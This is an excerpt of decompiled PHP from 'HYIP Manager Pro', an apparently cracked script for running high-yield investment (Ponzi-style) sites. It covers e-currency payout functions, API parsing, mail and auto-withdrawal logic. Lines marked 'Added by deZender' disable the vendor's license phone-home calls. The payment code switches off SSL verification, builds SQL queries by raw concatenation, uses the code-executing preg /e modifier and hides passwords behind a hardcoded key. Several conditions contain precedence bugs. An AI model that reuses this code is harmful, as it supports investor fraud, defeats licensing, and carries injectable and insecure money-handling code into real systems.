        $out['fee'] = getelement ($Verify, 'fee');
        if ($starttemp = stristr ($verifylist, '<transaction>') === false)
        {
          $done = true;
        }
        else
        {
          $startat = strlen ($verifylist) - strlen ($starttemp);
        }

        if ($endtemp = stristr ($verifylist, '</transaction>') === false)
        {
          $done = true;
          continue;
        }
        else
        {
          $endat = strlen ($verifylist) - strlen ($endtemp);
          continue;
        }
      }
    }

    $failedlist = getelement ($xmlcert, 'failed.list');
    if ($failedlist != '')
    {
      $out['status'] = 'error';
      $done = false;
      if ($starttemp = stristr ($failedlist, '<failed>') === false)
      {
        $done = true;
      }
      else
      {
        $startat = strlen ($failedlist) - strlen ($starttemp);
      }

      if ($endtemp = stristr ($failedlist, '</failed>') === false)
      {
        $done = true;
      }
      else
      {
        $endat = strlen ($failedlist) - strlen ($endtemp);
      }

      while (!$done)
      {
        $Failed = trim (substr ($failedlist, $startat + 13, $endat - 13));
        $failedlist = trim (substr ($failedlist, $endat + 14));
        $out['text'] = getelement ($Failed, 'error');
        if ($starttemp = stristr ($failedlist, '<failed>') === false)
        {
          $done = true;
        }
        else
        {
          $startat = strlen ($failedlist) - strlen ($starttemp);
        }

        if ($endtemp = stristr ($failedlist, '</failed>') === false)
        {
          $done = true;
          continue;
        }
        else
        {
          $endat = strlen ($failedlist) - strlen ($endtemp);
          continue;
        }
      }
    }

    $errorlist = getelement ($xmlcert, 'errorresponse.list');
    if ($errorlist != '')
    {
      $out['status'] = 'error';
      $done = false;
      if ($starttemp = stristr ($errorlist, '<errorresponse>') === false)
      {
        $done = true;
      }
      else
      {
        $startat = strlen ($errorlist) - strlen ($starttemp);
      }

      if ($endtemp = stristr ($errorlist, '</errorresponse>') === false)
      {
        $done = true;
      }
      else
      {
        $endat = strlen ($errorlist) - strlen ($endtemp);
      }

      while (!$done)
      {
        $ErrorResponse = trim (substr ($errorlist, $startat + 15, $endat - 15));
        $errdone = false;
        if ($starterr = stristr ($ErrorResponse, '<error>') === false)
        {
          $errdone = true;
        }
        else
        {
          $starterrat = strlen ($ErrorResponse) - strlen ($starterr);
        }

        if ($enderr = stristr ($ErrorResponse, '</error>') === false)
        {
          $errdone = true;
        }
        else
        {
          $enderrat = strlen ($ErrorResponse) - strlen ($enderr);
        }

        while (!$errdone)
        {
          $Error = trim (substr ($ErrorResponse, $starterrat + 7, $enderrat - 7));
          $ErrorResponse = trim (substr ($ErrorResponse, $enderrat + 8));
          $out['text'] = getelement ($Error, 'text');
          $out['additional'] = getelement ($Error, 'additional');
          if ($starterr = stristr ($ErrorResponse, '<error>') === false)
          {
            $errdone = true;
          }
          else
          {
            $starterrat = strlen ($ErrorResponse) - strlen ($starterr);
          }

          if ($enderr = stristr ($ErrorResponse, '</error>') === false)
          {
            $errdone = true;
            continue;
          }
          else
          {
            $enderrat = strlen ($ErrorResponse) - strlen ($enderr);
            continue;
          }
        }

        $errorlist = trim (substr ($errorlist, $endat + 16));
        if ($starttemp = stristr ($errorlist, '<errorresponse>') === false)
        {
          $done = true;
        }
        else
        {
          $startat = strlen ($errorlist) - strlen ($starttemp);
        }

        if ($endtemp = stristr ($errorlist, '</errorresponse>') === false)
        {
          $done = true;
          continue;
        }
        else
        {
          $endat = strlen ($errorlist) - strlen ($endtemp);
          continue;
        }
      }
    }

    return $out;
  }

  function getelement_pecunix ($data, $element)
  {
    $elementlen = strlen ($element) + 2;
    $pos1 = strpos ($data, '' . '<' . $element . ' ');
    $pos2 = strpos ($data, '' . '<' . $element . '>');
    if ($pos1 !== false)
    {
      $startat = $pos1;
    }

    if ($pos2 !== false)
    {
      $startat = $pos2;
    }

    if ($startat === false)
    {
      return '';
    }

    if ($endat = strpos ($data, '' . '</' . $element . '>') === false)
    {
      return '';
    }

    $startendat = strpos ($data, '>', $startat);
    $value = trim (substr ($data, $startendat + 1, $endat - ($startat + $elementlen)));
    return $value;
  }

  function parsexml_pecunix ($xmlcert)
  {
    $out = array ();
    $verifylist = getelement_pecunix ($xmlcert, 'Receipt');
    if ($verifylist != '')
    {
      $out['status'] = 'ok';
      $Verify = $verifylist;
      $out['batch'] = getelement_pecunix ($Verify, 'ReceiptId');
      $out['payer'] = getelement_pecunix ($Verify, 'Payer');
      $out['payee'] = getelement_pecunix ($Verify, 'Payee');
      $Equivalent = getelement_pecunix ($Verify, 'Equivalent');
      $out['amount'] = getelement_pecunix ($Equivalent, 'Amount');
      $out['currency'] = getelement_pecunix ($Equivalent, 'CurrencyId');
    }

    $errorlist = getelement_pecunix ($xmlcert, 'ErrorResponse');
    if ($errorlist != '')
    {
      $out['status'] = 'error';
      $Error = $errorlist;
      $out['text'] = getelement_pecunix ($Error, 'Text');
      $out['additional'] = getelement_pecunix ($Error, 'Additional');
    }

    return $out;
  }

  function parsexml_libertyreserve ($xmlcert)
  {
    $out = array ();
    $verifylist = getelement_pecunix ($xmlcert, 'Receipt');
    if ($verifylist != '')
    {
      $out['status'] = 'ok';
      $Verify = $verifylist;
      $out['batch'] = getelement_pecunix ($Verify, 'ReceiptId');
      $out['payer'] = getelement_pecunix ($Verify, 'Payer');
      $out['payee'] = getelement_pecunix ($Verify, 'Payee');
      $out['amount'] = getelement_pecunix ($Verify, 'Amount');
      $out['currency'] = getelement_pecunix ($Verify, 'CurrencyId');
    }

    $errorlist = getelement_pecunix ($xmlcert, 'Balance');
    if ($errorlist != '')
    {
      $out['status'] = 'ok';
      $Error = $errorlist;
      $out['value'] = getelement_pecunix ($Error, 'Value');
    }

    $errorlist = getelement_pecunix ($xmlcert, 'Error');
    if ($errorlist != '')
    {
      $out['status'] = 'error';
      $Error = $errorlist;
      $out['text'] = getelement_pecunix ($Error, 'Text');
      $out['additional'] = getelement_pecunix ($Error, 'Description');
    }

    return $out;
  }

  function parsexml_vmoney ($xmlcert)
  {
    $out = array ();
    $verifylist = getelement_pecunix ($xmlcert, 'Status');
    if (getelement_pecunix ($verifylist, 'Code') == 'Success')
    {
      $out['status'] = 'ok';
    }
    else
    {
      $out['status'] = 'error';
      $out['text'] = getelement_pecunix ($xmlcert, 'Message');
    }

    $balance = getelement_pecunix ($xmlcert, 'Balance');
    if ($balance != '')
    {
      $out['value'] = $balance;
    }

    $verifylist = getelement_pecunix ($xmlcert, 'Transfer');
    if ($verifylist != '')
    {
      $out['payer'] = getelement_pecunix ($verifylist, 'Payer');
      $out['payee'] = getelement_pecunix ($verifylist, 'Payee');
      $out['amount'] = getelement_pecunix ($verifylist, 'Amount');
      $out['memo'] = getelement_pecunix ($verifylist, 'Memo');
      $out['batch'] = getelement_pecunix ($verifylist, 'Batch');
      $out['text'] = getelement_pecunix ($verifylist, 'Message');
    }

    return $out;
  }

  function send_money_to_perfectmoney ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to PerfectMoney account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid PerfectMoney account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 18);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'perfectmoney_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $perfectmoney_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        list ($perfectmoney_password, $perfectmoney_code) = preg_split ('/\\|/', $e_password);
        $settings['perfectmoney_payer_account'] = $perfectmoney_code;
      }

      $ch = curl_init ();
      $memo = rawurlencode ($memo);
      curl_setopt ($ch, CURLOPT_URL, 'https://www.perfectmoney.com/acct/confirm.asp');
      curl_setopt ($ch, CURLOPT_POST, 1);
      curl_setopt ($ch, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($settings['perfectmoney_from_account']) . '&PassPhrase=' . rawurlencode ($perfectmoney_password) . '&Payer_Account=' . rawurlencode ($settings['perfectmoney_payer_account']) . '&Payee_Account=' . rawurlencode ($account) . '&Amount=' . rawurlencode ($amount) . ('' . '&Memo=' . $memo));
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $parts = array ();
      if (preg_match ('/<input name=\'PAYMENT_BATCH_NUM\' type=\'hidden\' value=\'(\\d+)\'>/ims', $a, $parts))
      {
        return array (1, '', $parts[1]);
      }
      else
      {
        if (preg_match ('/<input name=\'ERROR\' type=\'hidden\' value=\\\'(.*?)\\\'>/ims', $a, $parts))
        {
          $txt = preg_replace ('/&lt;/i', '<', $parts[1]);
          $txt = preg_replace ('/&gt;/i', '>', $txt);
          $e = quote ('' . $error_txt . ' ' . $txt);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ('' . ' ' . $txt), '');
        }
        else
        {
          $e = quote ('' . $error_txt . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_remitfund ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty RemitFund account.\'';
      mysql_query ($q);
      return array (0, 'Invalid RemintFund account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 25);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'remitfund_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $remitfund_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }

        $remitfund_code = $settings['remitfund_apiname'];
      }
      else
      {
        list ($remitfund_password, $remitfund_code) = preg_split ('/\\|/', $e_password);
      }

      $ch = curl_init ();
      $token = strtoupper (md5 ('' . $remitfund_code . 'transferUSD' . $settings['remitfund_from_account'] . $account . $amount . strtoupper (md5 ($remitfund_password))));
      $data = '<TransferRequest>
  <Auth>
    <ApiName>' . htmlspecialchars ($remitfund_code) . ('' . '</ApiName>
    <Token>' . $token . '</Token>
  </Auth>
  <Transfer>
    <TransferId></TransferId>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($settings['remitfund_from_account'], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($account, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>USD</CurrencyId>
    <Amount>' . htmlentities ($amount, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($memo, ENT_NOQUOTES) . '</Memo>
  </Transfer>
</TransferRequest>';
      $ch = curl_init ();
      curl_setopt ($ch, CURLOPT_URL, 'https://www.remitfund.com/xml/api.php?req=' . urlencode ($data));
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $headers = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $out = parsexml_remitfund ($a);
      if ($out['status'] == 'ok')
      {
        return array (1, '', $out['batch']);
      }
      else
      {
        if ($out['status'] == 'error')
        {
          $e = quote ('' . $error_txt . ' ' . $out['text']);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = quote ('' . $error_txt . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function parsexml_remitfund ($xmlcert)
  {
    $out = array ();
    $verifylist = getelement_pecunix ($xmlcert, 'Response');
    if ($verifylist != '')
    {
      $Verify = $verifylist;
      $out['code'] = getelement_pecunix ($Verify, 'Code');
      $out['text'] = getelement_pecunix ($Verify, 'Message');
      $out['status'] = ($out['code'] == 0 ? 'ok' : 'error');
      $out['batch'] = getelement_pecunix ($Verify, 'TransferId');
      $out['payer'] = getelement_pecunix ($Verify, 'Payer');
      $out['payee'] = getelement_pecunix ($Verify, 'Payee');
      $out['amount'] = getelement_pecunix ($Verify, 'Amount');
      $out['currency'] = getelement_pecunix ($Verify, 'Currency');
    }

    return $out;
  }

  function myencode_string ($string, $a)
  {
    global $settings;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return encode_pass_for_mysql ($string);
    }

    $ret = base64_encode ($string);
    $a = preg_split ('//', $ret);
    $b = preg_split ('//', md5 ($string) . base64_encode ($string));
    $ret = '';
    for ($i = 0; $i < sizeof ($a); ++$i)
    {
      if (strlen ($a[$i]) == 0)
      {
        continue;
      }

      $ret = $ret . $a[$i] . $b[$i];
    }

    $ret = str_replace ('=', '!!!^', $ret);
    return encode_str2 ($ret, $settings['key'], 'hyip manager pro 2005 jul 27');
  }

  function mydecode_sting ($string, $a)
  {
    global $settings;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return encode_pass_for_mysql ($string);
    }

    $string = str_replace ('!!!^', '=', decode_str2 ($string, $settings['key'], 'hyip manager pro 2005 jul 27'));
    $a = preg_split ('//', $string);
    $string = '';
    for ($i = 0; $i < sizeof ($a); $i += 2)
    {
      $string .= $a[$i - 1];
    }

    $ret = base64_decode ($string);
    return $ret;
  }

  function encode_pass_for_mysql ($string)
  {
    $ret = base64_encode ($string);
    $a = preg_split ('//', $ret);
    $b = preg_split ('//', md5 ($string) . base64_encode ($string));
    $ret = '';
    for ($i = 0; $i < sizeof ($a); ++$i)
    {
      $ret = $ret . $a[$i] . $b[$i];
    }

    $ret = str_replace ('=', '!!!^', $ret);
    return $ret;
  }

  function decode_pass_for_mysql ($string)
  {
    $string = str_replace ('!!!^', '=', $string);
    $a = preg_split ('//', $string);
    $string = '';
    for ($i = 0; $i < sizeof ($a); $i += 2)
    {
      $string .= $a[$i - 1];
    }

    $ret = base64_decode ($string);
    return $ret;
  }

  function send_string_to_gold_coders ()
  {
    global $frm_env;
    global $settings;
return;	// Added by deZender, 2010.01.30
    $domain = ($settings['use_ip_for_auto'] == 1 ? '64.27.18.142' : 'www.dnsargentina.com.ar');
    $handle = @fopen ('http://' . $domain . '/check.cgi?domain=' . $frm_env['HTTP_HOST'] . '&license=' . $settings['license'] . '&zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz', 'r');
    if ($handle)
    {
      fclose ($handle);
    }

  }

  function send_string_to_gold_coders_install ()
  {
    global $frm_env;
    global $settings;
return;	// Added by deZender, 2010.01.30
    $l = '';
    if (function_exists ('curl_init'))
    {
      $i = 0;
      while ($i < 2)
      {
        $ch = curl_init ();
        if ($i == 1)
        {
          $domain = '64.27.18.142';
        }
        else
        {
          $domain = 'www.dnsargentina.com.ar';
        }

        $url = 'http://' . $domain . '/check.cgi?install=1&script=3&domain=' . $frm_env['HTTP_HOST'] . '&license=' . $settings['license'] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc';
        curl_setopt ($ch, CURLOPT_URL, $url);
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
        $l = curl_exec ($ch);
        curl_close ($ch);
        if ($l != '')
        {
          $i = 2;
        }

        ++$i;
      }
    }

    if ($l == '')
    {
      $handle = @fopen ('http://www.dnsargentina.com.ar/check.cgi?install=1&script=3&domain=' . $frm_env['HTTP_HOST'] . '&license=' . $settings['license'] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc', 'r');
      if ($handle)
      {
        $l = fread ($handle, 200000);
        fclose ($handle);
      }
    }

    return $l;
  }

  function check_if_stolen ()
  {
  }

  function sha256g ($in)
  {
    global $frm_env;
    global $settings;
return;	// Added by deZender, 2010.01.30
    $str = base64_encode ($in);
    $ch = curl_init ();
    $memo = rawurlencode ($memo);
    if ($settings['use_ip_for_auto'] == 1)
    {
      $domain = '64.27.18.142';
    }
    else
    {
      if ($settings['use_ip_for_auto'] == 2)
      {
        $domain = 'www.goldcodersmail.com';
      }
      else
      {
        $domain = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($ch, CURLOPT_URL, 'http://' . $domain . '/get_sha256.php');
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_POSTFIELDS, '' . 'in=' . $str . '&domain=' . $frm_env['HTTP_HOST'] . '&s=p&license=' . $settings['license']);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($ch);
    curl_close ($ch);
    return chop ($l);
  }

  function get_pid ($in, $mode = 0)
  {
    global $frm_env;
    global $settings;
return;	// Added by deZender, 2010.01.30
    if ($mode == 1)
    {
      $str = substr (trim ($in), 0, 32);
    }
    else
    {
      $str = base64_encode (serialize ($in));
    }

    $ch = curl_init ();
    $memo = rawurlencode ($memo);
    if ($settings['use_ip_for_auto'] == 1)
    {
      $domain = '64.27.18.142';
    }
    else
    {
      if ($settings['use_ip_for_auto'] == 2)
      {
        $domain = 'www.goldcodersmail.com';
      }
      else
      {
        $domain = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($ch, CURLOPT_URL, 'http://' . $domain . '/get_pid.php');
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_POSTFIELDS, '' . 'in=' . $str . '&mode=' . $mode . '&domain=' . $frm_env['HTTP_HOST'] . '&s=p&license=' . $settings['license']);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($ch);
    curl_close ($ch);
    if ($mode == 1)
    {
      $out = array ();
      if ($l != 'nill')
      {
        $out = unserialize (base64_decode (chop ($l)));
        if (!is_array ($out))
        {
          $out = array ();
        }
      }

      return $out;
    }
    else
    {
      return chop ($l);
    }

  }

  function send_mail ($email_id, $to, $from, $info)
  {
    global $settings;
    $q = '' . 'select * from hm2_emails where id = \'' . $email_id . '\'';
    $sth = mysql_query ($q);
    $row = mysql_fetch_array ($sth);
    if (!$row)
    {
      return null;
    }

    if (!$row['status'])
    {
      return null;
    }

    $text = $row['text'];
    $html = $row['html'];
    $subject = $row['subject'];
    foreach ($info as $k => $v)
    {
      if (is_array ($v))
      {
        $v = $v[0];
      }

      $text = preg_replace ('' . '/#' . $k . '#/', $v, $text);
      $subject = preg_replace ('' . '/#' . $k . '#/', $v, $subject);
      if ($row['use_html'])
      {
        $html = preg_replace ('' . '/#' . $k . '#/', $v, $html);
        continue;
      }
    }

    $text = preg_replace ('/#site_name#/', $settings['site_name'], $text);
    if ($row['use_html'])
    {
      $html = preg_replace ('/#site_name#/', $settings['site_name'], $html);
    }

    $subject = preg_replace ('/#site_name#/', $settings['site_name'], $subject);
    $text = preg_replace ('/#site_url#/', $settings['site_url'], $text);
    if ($row['use_html'])
    {
      $html = preg_replace ('/#site_url#/', $settings['site_url'], $html);
    }

    $subject = preg_replace ('/#site_url#/', $settings['site_url'], $subject);
    if ($row['use_html'])
    {
      $boundary = get_rand_md5 (12);
      $text = encode_8bit ($text);
      $html = encodeqp ($html);
      $body = '' . '--' . $boundary . '
Content-Type: text/plain;
Content-Transfer-Encoding: 8bit

' . $text . '

--' . $boundary . '
Content-Type: text/html;
Content-transfer-encoding: quoted-printable;

' . $html . '

--' . $boundary . '--';
    }
    else
    {
      $body = $text;
    }

    if ($settings['site_name'] == 'free')
    {
      $fh = fopen ('mails.txt', 'a');
      fwrite ($fh, '' . 'TO: ' . $to . '
From: ' . $from . '
Subject: ' . $subject . '

' . $text . '

');
      fclose ($fh);
    }
    else
    {
      mail ($to, $subject, $body, '' . 'From: ' . $from . '
Reply-To: ' . $from . ($row['use_html'] ? '' . '
Content-Type: multipart/alternative; boundary=' . $boundary : ''));
    }

  }

  function fixeol ($str)
  {
    $str = str_replace ('
', '
', $str);
    $str = str_replace ('
', '
', $str);
    return $str;
  }

  function encode_8bit ($str)
  {
    $encoded = fixeol ($str);
    if (substr ($encoded, 0 - strlen ('
')) != '
')
    {
      $encoded .= '
';
    }

    return $encoded;
  }

  function encodeqp ($str)
  {
    $encoded = fixeol ($str);
    if (substr ($encoded, 0 - strlen ('
')) != '
')
    {
      $encoded .= '
';
    }

    $encoded = preg_replace ('/([\\000-\\010\\013\\014\\016-\\037\\075\\177-\\377])/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\'))', $encoded);
    $encoded = preg_replace ('/([	 ])
/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\')).\'
\'', $encoded);
    $encoded = wraptext ($encoded, 74, true);
    return $encoded;
  }

  function wraptext ($message, $length, $qp_mode = false)
  {
    $soft_break = ($qp_mode ? sprintf (' =%s', '
') : '
');
    $message = fixeol ($message);
    if (substr ($message, -1) == '
')
    {
      $message = substr ($message, 0, -1);
    }

    $line = explode ('
', $message);
    $message = '';
    for ($i = 0; $i < count ($line); ++$i)
    {
      $line_part = explode (' ', $line[$i]);
      $buf = '';
      for ($e = 0; $e < count ($line_part); ++$e)
      {
        $word = $line_part[$e];
        if (($qp_mode AND $length < strlen ($word)))
        {
          $space_left = $length - strlen ($buf) - 1;
          if ($e != 0)
          {
            if (20 < $space_left)
            {
              $len = $space_left;
              if (substr ($word, $len - 1, 1) == '=')
              {
                --$len;
              }
              else
              {
                if (substr ($word, $len - 2, 1) == '=')
                {
                  $len -= 2;
                }
              }

              $part = substr ($word, 0, $len);
              $word = substr ($word, $len);
              $buf .= ' ' . $part;
              $message .= $buf . sprintf ('=%s', '
');
            }
            else
            {
              $message .= $buf . $soft_break;
            }

            $buf = '';
          }

          while (0 < strlen ($word))
          {
            $len = $length;
            if (substr ($word, $len - 1, 1) == '=')
            {
              --$len;
            }
            else
            {
              if (substr ($word, $len - 2, 1) == '=')
              {
                $len -= 2;
              }
            }

            $part = substr ($word, 0, $len);
            $word = substr ($word, $len);
            if (0 < strlen ($word))
            {
              $message .= $part . sprintf ('=%s', '
');
              continue;
            }
            else
            {
              $buf = $part;
              continue;
            }
          }

          continue;
        }

        $buf_o = $buf;
        $buf .= ($e == 0 ? $word : ' ' . $word);
        if (($length < strlen ($buf) AND $buf_o != ''))
        {
          $message .= $buf_o . $soft_break;
          $buf = $word;
          continue;
        }
      }

      $message .= $buf . '
';
    }

    return $message;
  }

  function start_info_table ($size = '100%')
  {
    return '' . '
<table cellspacing=0 cellpadding=1 border=0 width=' . $size . ' bgcolor=#FF8D00>
<tr><td bgcolor=#FF8D00>
<table cellspacing=0 cellpadding=0 border=0 width=100%>
<tr>
<td valign=top width=10 bgcolor=#FFFFF2><img src=images/sign.gif></td>
<td valign=top bgcolor=#FFFFF2 style=\'padding: 10px; color: #D20202; font-family: verdana; font-size: 11px;\'>
';
  }

  function end_info_table ()
  {
    return '</td></tr></table></td></tr></table>';
  }

  function pay_direct_earning ($deposit_id, $amount, $date)
  {
    global $settings;
    if ($settings['demomode'] == 1)
    {
      return null;
    }

    if ($settings['use_auto_payment'] == 1)
    {
      $q = '' . 'select * from hm2_deposits where id = ' . $deposit_id;
      ($sth = mysql_query ($q) OR print mysql_error ());
      $dep = mysql_fetch_array ($sth);
      if (!$exchange_systems[$dep['ec']]['auto'])
      {
        return null;
      }

      $q = 'select * from hm2_users where id = ' . $dep['user_id'];
      ($sth = mysql_query ($q) OR print mysql_error ());
      $user = mysql_fetch_array ($sth);
      if (($user['admin_auto_pay_earning'] != 1 OR $user['user_auto_pay_earning'] != 1))
      {
        return null;
      }

      if (0 < $settings['stop_withdraw_percent'])
      {
        $q = 'select sum(actual_amount*(type = \'add_funds\')) as td, sum(actual_amount*(type = \'withdrawal\')) as tw from hm2_history where type in (\'add_funds\', \'withdrawal\')';
        ($sth = mysql_query ($q) OR print mysql_error ());
        $row = mysql_fetch_array ($sth);
        if (0 < $row['td'])
        {
          if ($settings['stop_withdraw_percent'] <= ($row['tw'] + $amount) * 100 / $row['td'])
          {
            return null;
          }
        }
      }

      $accounts = unserialize ($user['accounts']);
      $amount = abs ($amount);
      $fee = floor ($amount * $settings['withdrawal_fee']) / 100;
      if ($fee < $settings['withdrawal_fee_min'])
      {
        $fee = $settings['withdrawal_fee_min'];
      }

      $to_withdraw = $amount - $fee;
      if ($to_withdraw < 0)
      {
        $to_withdraw = 0;
      }

      $to_withdraw = sprintf ('%.02f', floor ($to_withdraw * 100) / 100);
      if ($settings['egold_withdraw_string'] != '')
      {
        $success_txt = '' . 'Earning from deposit $' . $dep['actual_amount'] . '. Auto withdraw to ' . $user['username'] . ' from ' . $settings['site_name'];
      }
      else
      {
        $success_txt = $settings['egold_withdraw_string'];
      }

      $error_txt = '' . 'Auto-withdrawal error, tried to send ' . $to_withdraw . ' earning to ' . $exchange_systems[$dep['ec']]['name'] . ' account # ' . $accounts[$dep['ec']] . '. Error:';
      if ($dep['ec'] == 0)
      {
        list ($res, $text, $batch) = send_money_to_egold ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 1)
      {
        list ($res, $text, $batch) = send_money_to_evocash ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 2)
      {
        list ($res, $text, $batch) = send_money_to_intgold ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 5)
      {
        list ($res, $text, $batch) = send_money_to_ebullion ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 8)
      {
        list ($res, $text, $batch) = send_money_to_eeecurrency ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 9)
      {
        list ($res, $text, $batch) = send_money_to_pecunix ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 15)
      {
        list ($res, $text, $batch) = send_money_to_libertyreserve ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 16)
      {
        list ($res, $text, $batch) = send_money_to_vmoney ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 17)
      {
        list ($res, $text, $batch) = send_money_to_altergold ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 18)
      {
        list ($res, $text, $batch) = send_money_to_perfectmoney ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($dep['ec'] == 24)
      {
        list ($res, $text, $batch) = send_money_to_evowallet ('', $to_withdraw, $accounts[$dep['ec']], $success_txt, $error_txt);
      }

      if ($res == 1)
      {
        $q = 'insert into hm2_history set
            user_id = ' . $user['id'] . ('' . ',
        		amount = -' . $amount . ',
            		actual_amount = -' . $amount . ',
        		type=\'withdrawal\',
            		' . $date . ',
			ec = ') . $dep['ec'] . ',
        		description = \'Auto-withdrawal earning to account ' . $accounts[$dep['ec']] . ('' . '. Batch is ' . $batch . '\'');
        (mysql_query ($q) OR print mysql_error ());
        $info = array ();
        $info['username'] = $user['username'];
        $info['name'] = $user['name'];
        $info['amount'] = $amount;
        $info['batch'] = $batch;
        $info['account'] = $accounts[$dep['ec']];
        $info['currency'] = $exchange_systems[$dep['ec']]['name'];
        send_mail ('withdraw_user_notification', $user['email'], $settings['system_email'], $info);
        send_mail ('withdraw_admin_notification', $settings['system_email'], $settings['system_email'], $info);
      }
    }

  }

  function count_earning_weekdayscount ($u_id)
  {
    global $settings;
    $types = array ();
    if (($settings['use_crontab'] == 1 AND $u_id != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($sth = mysql_query ($q) OR print mysql_error ());
    while ($row = mysql_fetch_array ($sth))
    {
      $types[$row['parent']][$row['id']] = $row;
    }

    $lines = 1;
    $u_cond = 'u.last_access_time + interval 30 minute < now() ';
